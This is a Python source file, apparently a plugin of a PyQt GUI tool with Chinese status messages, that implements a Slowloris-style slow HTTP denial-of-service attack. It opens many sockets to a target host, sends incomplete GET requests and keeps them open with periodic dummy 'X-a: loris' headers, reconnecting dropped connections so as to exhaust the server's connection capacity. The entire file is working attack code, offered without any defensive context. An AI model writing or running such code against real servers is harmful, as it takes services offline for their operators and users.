import argparse
from threading import Thread
import socket
import random
import time
from PyQt5.Qt import pyqtSignal,QThread
import plugins.config



class Slowhttp(QThread):
    str_signal = pyqtSignal([str,str])

    def __init__(self,host,port,num_of_sockets,wait_time):
        super().__init__()
        self.host = host
        self.port = port
        self.num_of_sockets = int(num_of_sockets)
        self.wait_time = int(wait_time)
        self.connections = list()

    def initiate_connection(self):
        s = None
        for res in socket.getaddrinfo(self.host, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res
            try:
                s = socket.socket(af, socktype, proto)
            except socket.error as msg:
                self.str_signal[str,str].emit('[+] 初始化连接:' + msg,'green')
                s = None
                continue
            try:
                s.settimeout(5)
                s.connect(sa)
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1993)).encode("utf-8"))
                s.send(
                    "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n".encode(
                        "utf-8"))
                s.send("Accept-language: en-US,en\r\n".encode("utf-8"))
            except socket.error as msg:
                self.str_signal[str, str].emit('[+] 初始化连接:' + str(msg), 'green')
                s.close()
                s = None
                continue
            break
        if s is None:
            self.str_signal[str, str].emit('[-] 可能无法打开socket', 'red')
        return s

    def keep_connection_alive(self,socket):
        if plugins.config.slowhttp_wait == 0:
            success = False
            try:
                socket.send("X-a: loris{}\r\n".format(random.randint(1, 1337)).encode("utf-8"))
                success = True
            except socket.error as msg:
                self.str_signal[str, str].emit('[+] 保持连接存活:' + msg, 'green')
            if success == False:
                self.str_signal[str, str].emit('[-] 连接 ' + str(self.connections.index(socket)) + ' 断开，正在重连...', 'red')
                socket = self.initiate_connection()
        else:
            return

    def run(self):
        # Init connections
        self.str_signal[str, str].emit('[+] 启动连接...', 'green')
        for i in range(self.num_of_sockets):
            socket = self.initiate_connection()
            self.connections.append(socket)
            print("Set up connection " + str(i))
            self.str_signal[str, str].emit('[+] 启动连接: ' + str(i), 'green')
        self.str_signal[str, str].emit('[+] 连接已建立...', 'green')

        # Keep connections alive
        while True:
            if plugins.config.slowhttp_wait == 0:
                print("Keeping connections alive...")
                self.str_signal[str, str].emit('[+] 保持连接存活...', 'green')
                for socket in self.connections:
                    thread = Thread(target=self.keep_connection_alive, args=(socket,))
                    thread.daemon = True
                    thread.start()
                print(str(len(self.connections)) + " active connection(s).")
                self.str_signal[str, str].emit('[+] ' + str(len(self.connections)) + '连接存活', 'green')
                time.sleep(self.wait_time)
            else:
                return